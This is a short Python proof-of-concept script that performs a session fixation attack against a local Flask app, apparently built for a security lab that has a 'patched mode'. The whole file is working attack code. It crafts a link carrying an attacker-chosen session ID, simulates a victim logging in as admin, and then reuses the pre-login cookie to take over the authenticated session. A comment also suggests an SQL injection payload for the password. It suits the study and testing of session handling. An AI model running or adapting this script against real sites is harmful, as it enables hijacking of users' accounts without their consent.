import requests

BASE_URL = "http://127.0.0.1:5000"
KNOWN_SESSION_ID = "HACKER_CONTROLLED_SESSION_123"

def fixate():
    print("="*50)
    print("           SESSION FIXATION SCRIPT           ")
    print("="*50)
    
    # 1. Attacker sets up the trap
    attacker_session = requests.Session()
    fixation_link = f"{BASE_URL}/set_session?sessionid={KNOWN_SESSION_ID}"
    
    print(f"\n[1] Attacker generates a known session ID: {KNOWN_SESSION_ID}")
    print(f"[2] Attacker tricks victim into clicking this exact link:")
    print(f"    {fixation_link}")
    
    # 2. Attacker grabs the exact Flask cookie structure that contains this session_id.
    #    (Since Flask uses signed cookies, the attacker just lets the server sign their chosen ID).
    attacker_session.get(fixation_link)
    pre_auth_cookie = attacker_session.cookies.get('session')
    
    print("\n[3] (Simulating Victim) Victim clicks the link and logs in...")
    # The victim's browser adopts the fixed session cookie
    victim_session = requests.Session()
    victim_session.cookies.set('session', pre_auth_cookie)
    
    # Victim authenticates normally (the server binds their user account to the attacker's chosen ID)
    login_data = {
        'username': 'admin',
        'password': 'adminpassword' # Or an SQLi payload
    }
    victim_session.post(f"{BASE_URL}/login", data=login_data)
    
    print("\n[4] (Attacker) The attacker now tries to access the dashboard using the SAME known pre-login cookie...")
    
    # Attacker uses their original pre-auth cookie
    attack_resp = attacker_session.get(f"{BASE_URL}/dashboard")
    
    if "Welcome," in attack_resp.text:
        print("\n[+] SUCCESS! Session Fixation achieved.")
        print("[+] The server trusted the attacker's pre-existing session ID after the victim logged in.")
        print("[+] The attacker now shares the victim's authenticated session!")
    else:
        print("\n[-] Failed. The server likely rejected the old session ID upon login (Patched mode enabled).")

if __name__ == '__main__':
    fixate()
